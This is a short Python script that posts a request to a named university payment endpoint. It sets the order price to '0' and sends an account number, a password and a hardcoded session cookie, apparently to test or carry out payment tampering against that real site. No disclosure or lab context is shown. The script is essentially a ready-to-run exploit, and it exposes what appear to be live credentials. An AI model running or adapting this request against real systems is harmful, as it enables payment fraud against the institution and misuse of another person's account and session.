import requests

# The URL to which the request will be sent
url = 'http://ydfwpt.cug.edu.cn/pay/account/topay.html'

# Headers for the request
headers = {
    'Accept': 'application/json, text/javascript, */*; q=0.01',
    'X-Requested-With': 'XMLHttpRequest',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5615.50 Safari/537.36',
    'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
    'Origin': 'http://ydfwpt.cug.edu.cn',
    'Referer': 'http://ydfwpt.cug.edu.cn/pay/show.html?id=1712387785242460',
    'Accept-Encoding': 'gzip, deflate',
    'Accept-Language': 'zh-CN,zh;q=0.9',
    'Connection': 'close',
}

# Data to be sent in the request body
data = {"payid":2,"orderid":"1712387785242460","ctypeindex":0,"price":"0","accountno":"183455","ccctype":"000","password":"183813"}

# Cookies to be sent with the request
cookies = {
    'JSESSIONID': 'DE85052E5BAD534500F38205ED8C0728'
}

# Sending the POST request
response = requests.post(url, headers=headers, json=data, cookies=cookies)

# Printing the response
print(response)
